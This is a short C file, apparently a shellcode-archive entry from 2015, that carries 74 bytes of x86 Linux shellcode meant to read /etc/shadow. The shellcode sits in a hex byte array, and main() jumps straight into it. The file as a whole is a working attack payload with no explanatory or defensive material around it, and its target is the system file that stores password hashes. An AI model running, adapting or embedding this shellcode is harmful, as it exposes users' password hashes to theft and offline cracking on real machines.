/*
Reading /etc/shadow linux/x86 (74 bytes)
Author: MMxM (@hc0d3r)
Sáb Mai  9 16:54:36 BRT 2015
*/


#include <stdio.h>

unsigned const char sc[]=
	"\x31\xc0\x31\xc9\x99\xb0\x05\x51\x68\x61\x64\x6f\x77\x68"
	"\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\xcd\x80\x89"
	"\xc3\xb0\xc5\x89\xe1\xcd\x80\x8b\x4c\x24\x2c\xb0\xc0\x89"
	"\xdf\x31\xdb\x31\xd2\x31\xed\x42\x6a\x02\x5e\xcd\x80\x89"
	"\xca\x89\xc1\x31\xc0\xb0\x04\x43\xcd\x80\x31\xc0\xb0\x06"
	"\x89\xfb\xcd\x80";

int main(void){
	__asm__("jmp sc");
	return 0;
}
